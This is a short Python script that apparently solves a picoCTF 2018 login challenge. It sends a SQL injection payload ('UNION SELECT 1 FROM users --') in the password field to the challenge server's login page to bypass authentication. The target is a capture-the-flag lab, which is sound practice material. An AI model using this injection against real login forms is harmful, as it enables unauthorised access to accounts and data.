import requests

def perform_injection(username, password):
  data = {"debug" : "1", "username" : username, "password" : password}
  r = requests.post("http://2018shell2.picoctf.com:53261/login.php", data = data)
  print r.text

perform_injection("username", "password' UNION SELECT 1 FROM users --")
